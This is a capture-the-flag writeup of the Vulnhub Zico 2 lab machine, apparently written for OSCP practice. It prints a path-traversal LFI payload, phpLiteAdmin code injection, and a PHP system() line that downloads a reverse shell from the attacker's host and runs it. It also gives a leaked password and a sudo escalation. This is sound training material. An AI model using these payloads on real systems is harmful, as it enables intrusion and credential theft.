# :game_die: Vulnhub Zico 2 Writeup Oscp Prep By Dollarboysushil B70F7A51B7C8

---

Nmap Scan

port `22 `ssh
port `80 `http
port `111` rpcbind

nothing much here , lets check the page source `Ctrl + U`

We have some thing interesting. `/view.php?page=tools.html` Lets try for `LFI `Local File Inclusion

`/view.php?page=../../../../../../../../../../../../etc/passwd`

and it is vulnerable to LFI.

Running gobuster reveals we have `/dbadmin` directory. Lets check it out.

looking at `/dbadmin` we have `test_db.php`

Opening `test_db.php` we have phpliteadmin panel.
Key thing to note is, `v1.9.3 `running

Searching for `PHPLiteAdmin 1.9.3` reveals it is vulnerable to remote PHP code injection.

Entering default password `admin` gives us access.

Lets try to exploit.

Create database with `.php` extension, i will name it `hack.php`

set type `TEXT` and Default Value `<?php phpinfo()?>`
It is a PHP code snippet that calls the `phpinfo()` function . This function will display detailed information about the PHP configuration on a web server.

Then use LFI to call this database
`../../../../../../../../../usr/databases/hack.php`

So the exploit work.

Now instead of injecting this`<?php phpinfo()?>` code, we will inject another malacious code which will give us a `shell` .

## Get dollarboysushil’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

So here is the step we will follow.
1) Download the Phpreverseshell.php from here. [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

under this .php script change the $ip to your machine ip and remember the port, we will use the port to get our self `shell`

2) Then we will create a python server in the same location where the php script is store.

remember the port `8000` which we will use to download the php script in victim.

3) Make sure netcat is listning

4) Then we will inject

>

<?php system(“wget 192.168.217.128:8000/php-reverse-shell.php -O /tmp/reverse-shell.php; php /tmp/reverse-shell.php”); ?>’)

This code will download the php script from our machine and save it into /tmp directory and then run the downloaded shell.

make sure to change ip to your machine and port to same we used in python server.

then using LFI to run the hack. Website stucks on infinite login

we should get a shell as user `www-data`

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

use the above code to upgrade the shell.

Then our next step would be to check for config files if found.
Thank fully there is wp-config.php under wordpress directory on home folder of user zico.

Luckly it contains credentials for zico.

`zico:sWfCsfJSPV9H3AmQzw8`

At first i thought this must be encrypted, but it was not.

Then ssh login as user zico

## Privelege escalation

running `sudo -l` reveals we can use `tar` and `zip` as root.

looking at [https://gtfobins.github.io/](https://gtfobins.github.io/)

we can get root shell as

and we are able to read the root.txt stored in root directory.

---
